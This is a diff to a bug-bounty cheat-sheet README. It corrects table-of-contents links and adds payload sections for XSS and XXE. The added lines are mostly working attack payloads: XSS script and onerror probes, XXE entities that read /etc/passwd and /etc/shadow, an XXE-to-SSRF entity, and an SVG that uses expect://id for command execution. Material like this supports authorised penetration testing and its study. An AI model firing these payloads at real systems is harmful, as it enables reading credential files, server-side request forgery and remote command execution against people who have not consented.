@@ -18,7 +18,8 @@
 
 ### BugBounty
   - [Bypass file upload filtering](#bypass-file-upload-filtering)
-  - [XSS](#xxe-basic-payloads)
+  - [XSS](#xxe-common-payloads)
+  - [XXE](#xxe-common-payloads)
   - [SSTI](#server-side-template-injection-ssti-to-rce)
   - [LFI](#local-file-inclusion-lfi-payloads)
   - [RFI](#remote-file-inclusion-rfi)
@@ -56,18 +57,53 @@ mv evil.jpg evil.php.jpg
 ```
 -------------------------------------------------------------------------------------------------------------
 
-
-# XXE basic payloads
-
+# XSS common payloads
 ```
+<img src=x>
 <script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 <embed src="javascript:alert(1)">
 <img src="javascript:alert(1)">
 <image src="javascript:alert(1)">
 <script src="javascript:alert(1)">
 ```
-------------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------------
+# XXE common payloads
+### XXE: read local files
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+```
+### use replace funtion if case sensitive
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/shadow"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&exploit;</lastName>
+</userInfo>
+```
+### XXE to SSRF
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+```
+### XXE inside SVG
+```xml
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://id"></image>
+</svg>
+```
+
+#### [source](https://github.com/payloadbox/xxe-injection-payload-list)
+--------------------------------------------------------------------------------------------------------------
 # Server Side Template Injection (SSTI) to RCE
 
 * Try this, everywhere the app is taking input from the user and reflecting the output.
